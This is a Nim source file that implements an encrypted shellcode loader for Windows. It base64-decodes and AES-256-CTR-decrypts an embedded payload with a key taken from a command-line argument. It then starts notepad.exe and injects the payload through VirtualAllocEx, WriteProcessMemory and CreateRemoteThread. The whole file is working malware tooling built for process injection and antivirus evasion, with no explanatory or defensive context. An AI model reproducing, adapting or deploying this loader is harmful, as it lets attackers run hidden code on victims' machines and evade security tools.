import winim/lean
import osproc
import os
import strformat
import dynlib
import base64
import nimcrypto
import nimcrypto/sysrand

proc CRT[byte](shellcode: openArray[byte]): void =
    let tProcess = startProcess("notepad.exe")
    let Hand = OpenProcess(PROCESS_ALL_ACCESS,false,cast[DWORD](tProcess.processID))
    let Point = VirtualAllocEx(Hand,NULL,cast[SIZE_T](shellcode.len),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
    WriteProcessMemory(Hand,Point,unsafeAddr shellcode,cast[SIZE_T](shellcode.len),NULL)
    # var Old: PDWORD
    # VirtualProtectEx(Hand,Point,cast[SIZE_T](shellcode.len),PAGE_EXECUTE_READ, Old)
    CreateRemoteThread(Hand,NULL,0,cast[LPTHREAD_START_ROUTINE](Point),NULL,0,NULL)


when isMainModule:

    func toByteSeq*(str: string): seq[byte] {.inline.} = @(str.toOpenArrayByte(0, str.high))
    let code: string = "Qcpl4JUHjauAZ6C6wAlJmH0wdJxp7MextjsXnFiR8Ur9fYAJTeQMiCpqbUvrbwECfCTp9cQiYRIdSaUnoGni1Hj9rh1AJVCLABMFz6+Je4phdr0915aiKIsPvxUxREhR3drq6S6s1CIXTj7GpU6TKGRRtgeA49xQV1kiipn+u36rfqg9Oy+NPl5BQ2XOT2KzJTccTm7T7UFIwHvELInjSzHPyY+9Zh6htZ1dOj2VjPad4wG4yko7Vwtl1veYEPh+0EOv7sWnAUz7NQjNaZi8qFOtJaT/SHJyoK7/Qr8pcqFU+dTSSsSt6BfIeATKEFuTSZtw4fnYz43DsGiJtL48IJoA1Y8lW2bWJca6YBpV8dT5L+iqEB8RSJ34lMeQeVatqEdsY5FjrD6FVqfdcRoWciONPHihTxH3BUgovWrHUI9S6AaaVvS24Sx/WIAt0wJhtT4i407YZxYmp4Ol6mIt3N7dCMnz11L3rIY0HEZ9IOmAjb9b7rKbkh7+HxvpFqzzAURmdDIb7vItZB5N11WecrtcgxtOCFejD0UxwW8DjZlAHmL7fBQXOeeNRvB8BurILw5LDnI7DvIOVoIbBK4mTEkpVZ/WZ0c3bJRnhH3eQXxwQblQktOFVWZ/fTXctgz15JYesSUKOOF6x2XOvgjHSiPq2hN5nhrq138BAoDT"
    var
        encrypted: seq[byte] = toByteSeq(decode(code))
        dctx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        decrypted: seq[byte] = newSeq[byte](len(encrypted))

    var expandedKey = sha256.digest(paramStr(1))
    copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))

    # Change  IV
    dctx.init(key, [byte 123, 231, 234, 243, 123, 231, 234, 243, 125, 249, 123, 231, 234, 243, 133, 149])
    dctx.decrypt(encrypted, decrypted)
    dctx.clear()
    CRT(decrypted)